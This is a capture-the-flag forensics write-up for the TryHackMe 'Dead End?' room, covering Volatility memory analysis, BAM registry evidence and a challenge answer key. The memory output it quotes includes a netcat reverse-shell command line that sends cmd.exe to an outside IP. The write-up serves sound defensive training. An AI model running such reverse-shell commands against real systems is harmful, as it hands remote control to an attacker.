# [Dead End?](https://tryhackme.com/room/deadend)

## You're given a memory image and a disk image - help us find the flag!

# Memory

An in-depth analysis of specific endpoints is reserved for those you're certain to have been compromised. It is usually done to understand how specific adversary tools or malwares work on the endpoint level; the lessons learned here are applied to the rest of the incident.

You're presented with two main artefacts: a memory dump and a disk image. Can you follow the artefact trail and find the flag?

### What binary gives the most apparent sign of suspicious activity in the given memory image? Use the full path of the artefact.

_It's a well known binary_

1. Start by profiling the image with `windows.info` to verify it is valid and identify the OS version.

```bash
python3 vol.py -f ../RobertMemdump/memdump.mem windows.info
```

**Results:**

```
Volatility 3 Framework 2.7.0
Progress:  100.00		PDB scanning finished
Variable	Value

Kernel Base	0xf802388a7000
DTB	0x1aa000
Symbols	file:///home/ubuntu/Desktop/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/94E2AE6323B686F1F4B25BA580582E04-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdVersionBlock	0xf80238ca4f08
Major/Minor	15.17763
MachineType	34404
KeNumberProcessors	2
SystemTime	2024-05-14 22:07:36
NtSystemRoot	C:\Windows
NtProductType	NtProductServer
NtMajorVersion	10
NtMinorVersion	0
PE MajorOperatingSystemVersion	10
PE MinorOperatingSystemVersion	0
PE Machine	34404
PE TimeDateStamp	Sat May  4 18:48:48 2030
```

2. List all running processes with `windows.pslist` and look for parent-process anomalies. On a healthy Windows system every `svchost.exe` should be spawned by `services.exe`. Here one instance has PPID 1036, which resolves to `powershell.exe`, a clear sign of process masquerading.

```bash
python3 vol.py  -f ../RobertMemdump/memdump.mem windows.pslist
```

3. Confirm the finding by dumping the full command-line of every process with `windows.cmdline`. The suspicious `svchost.exe` was invoked with `-e cmd.exe 10.14.74.53 6996`. Classic `netcat` reverse-shell syntax that attaches `cmd.exe` to an outbound connection. This is not the legitimate Windows service host; it is a netcat binary renamed `svchost.exe` and dropped in `C:\Tools\`.

```bash
python3 vol.py -f ../RobertMemdump/memdump.mem windows.cmdline
```

**Results:**

```
...
5228	svchost.exe	"C:\Tools\svchost.exe" -e cmd.exe 10.14.74.53 6996
...
```

**Answer:** `C:\Tools\svchost.exe`

---

### The answer above shares the same parent process with another binary that references a .txt file - what is the full path of this .txt file?

1. Since the suspicious `svchost.exe` is a child of `powershell.exe`, use `windows.pstree` and filter around PID 5228 to reveal all sibling processes sharing the same parent. The output shows `notepad.exe` was also launched by the same `powershell.exe` session and was opened with `C:\Users\Bobby\Documents\tmp\part2.txt` as its argument.

```bash
python3 vol.py -f ../RobertMemdump/memdump.mem windows.pstree | egrep -C 5 5228
```

**Results:**

```
** 5660s584400.0explorer.exe	0xd28d6afb0080in54hed   -       3       False	2024-05-14 20:56:17.000000 	N/A	\Device\HarddiskVolume1\Windows\explorer.exe	C:\Windows\Explorer.EXE	C:\Windows\Explorer.EXE
*** 6988	5660	msedge.exe	0xd28d6b1a0080	0	-	3	False	2024-05-14 20:56:58.000000 	2024-05-14 21:04:09.000000 	\Device\HarddiskVolume1\Program Files (x86)\Microsoft\Edge\Application\msedge.exe	-	-
*** 1036	5660	powershell.exe	0xd28d6a3d3080	0	-	3	False	2024-05-14 22:06:21.000000 	2024-05-14 22:06:22.000000 	\Device\HarddiskVolume1\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	-	-
**** 2736	1036	conhost.exe	0xd28d6a19d080	3	-	3	False	2024-05-14 22:06:21.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4	C:\Windows\system32\conhost.exe
**** 3580	1036	notepad.exe	0xd28d6bc4a080	4	-	3	False	2024-05-14 22:06:22.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\notepad.exe	"C:\Windows\system32\NOTEPAD.EXE" C:\Users\Bobby\Documents\tmp\part2.txt	C:\Windows\system32\NOTEPAD.EXE
**** 5228	1036	svchost.exe	0xd28d6ad4e080	3	-	3	False	2024-05-14 22:06:22.000000 	N/A	\Device\HarddiskVolume1\Tools\svchost.exe	"C:\Tools\svchost.exe" -e cmd.exe 10.14.74.53 6996 	C:\Tools\svchost.exe
***** 3120	5228	cmd.exe	0xd28d6b96b080	1	-	3	False	2024-05-14 22:06:22.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\cmd.exe	cmd.exe	C:\Windows\SYSTEM32\cmd.exe
* 5356	5748	fontdrvhost.ex	0xd28d698df080	5	-	3	False	2024-05-14 20:56:16.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\fontdrvhost.exe	"fontdrvhost.exe"	C:\Windows\system32\fontdrvhost.exe
```

**Answer:** `C:\Users\Bobby\Documents\tmp\part2.txt`

---

# Disk

The disk image can be found in drive D:\Disk.

### What binary gives the most apparent sign of suspicious activity in the given disk image? Use the full path of the artefact.

_Auto connects to what? Is connector.ps1 downloaded or created?_

1. Mount the disk image. Browse to `C:\Tools\` - the same directory where the malicious `svchost.exe` was found in memory. The folder contains `windows-networking-tools-master`, which is an open-source Windows networking toolkit available on GitHub. Inside `LatestBuilds\x64\` sits `Autoconnector.exe`. The presence of a `connector.ps1` script in the project directory confirms the attacker created the auto-connection capability here using the toolkit to automatically establish a reverse shell back to their infrastructure.

**Answer:** ``C:\Tools\windows-networking-tools-master\windows-networking-tools-master\LatestBuilds\x64\Autoconnector.exe` `

---

### What is the full registry path where the existence of the binary above is confirmed?

_Hits you right in the face... bam!_

1. The hint references **BAM**: Background Activity Moderator, a Windows service that records the last execution timestamp of binaries on a per-user basis. Its entries are stored in `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings\` sub-keyed by user SID. Load the SYSTEM registry hive from the disk image in a tool such as Registry Explorer. Navigate to the `UserSettings` key and expand the SID `S-1-5-21-1966530601-3185510712-10604624-1008`. An entry for Autoconnector.exe is present, confirming it was executed on this machine.

**Answer:** `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-1966530601-3185510712-10604624-1008`

---

### What is the content of "Part2"?

1. Navigate to `C:\Users\Bobby\Documents\tmp\part2.txt` on the mounted disk image (the same path we identified from memory via the notepad.exe command line). The file contains a Base64-encoded string that forms the second half of the flag.

**Answer:** `faDB3XzJfcDF2T1R9`

---

### What is the flag?

1. Part1 of the encoded flag is embedded in the `connector.ps1` script found inside the `windows-networking-tools-master` project directory on the disk. Concatenate Part1 and Part2, then Base64-decode the combined string to recover the flag.

**Answer:** `THM{6***_***_****_***_*_****T}`
